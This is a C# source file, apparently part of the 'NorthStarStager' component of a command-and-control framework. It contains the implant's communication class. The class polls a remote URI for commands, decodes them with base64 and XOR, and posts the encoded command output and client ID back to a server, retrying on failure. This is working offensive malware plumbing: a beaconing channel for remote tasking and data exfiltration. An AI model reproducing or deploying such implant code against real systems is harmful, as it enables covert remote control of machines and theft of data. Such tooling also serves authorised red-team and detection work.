using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace NorthStarStager
{
    /*
    <explanation>
    This class is responsible for retrieving command and sending results.
    </explanation>
    */
    class sendRetrieve
    {
        static public int errorCounter = 0;
        static public string comm;

        /*
        <explanation>
        Send GET request to speficied uri and return response as command.
        </explanation>
        */
        public string _getCommand(String uri, System.Net.WebClient web, initialEnum enumEnv, Chiper chipops)
        {
            try
            {               
                comm = web.DownloadString(uri);
                string clearedComm = Regex.Replace(comm, @"^\s+$[\r\n]*", string.Empty, RegexOptions.Multiline);
                string decodedComm = chipops._xorOps(chipops._base64decode(clearedComm), enumEnv.xorKey);
                return decodedComm;
            }
            catch
            {

                while (true)
                {
                    if (errorCounter > 19)
                        break;
                    System.Threading.Thread.Sleep(enumEnv.waitTime);
                    try
                    {
                        comm = web.DownloadString(uri);
                        string clearCommand = chipops._xorOps(chipops._base64decode(comm), enumEnv.xorKey);
                        return clearCommand;

                    }
                    catch
                    {
                        errorCounter++;
                    }

                }      
                errorCounter = 0;
                return "";
            }
        }


        /*
       <explanation>
       Send result of command to speficied uri as rspns.
       </explanation>
       */
        public void _sendResult(String result, System.Net.WebClient web, initialEnum enumEnv, Chiper chipops)
        {
            string asd = chipops._base64encode(chipops._xorOps(result, enumEnv.xorKey));


            string myParameters = "sid=" + chipops._base64encode(chipops._xorOps(enumEnv.clientID,"northstar")) + "&rspns=" + chipops._base64encode(chipops._xorOps(result, enumEnv.xorKey));
            web.Headers[System.Net.HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
          
             try
            {
              string sendResult = web.UploadString(Globals.resultSendUri, myParameters);
            
            }
            catch
            {
                
                while (true)
                {
                    if (errorCounter > 19)
                        break;
                    System.Threading.Thread.Sleep(enumEnv.waitTime);
                    try
                    {
                        _sendResult(result, web, enumEnv, chipops);
                        break;
                    }
                    catch
                    {
                        errorCounter++;
                    }

                }
                errorCounter = 0;


            }
        }
    }
}
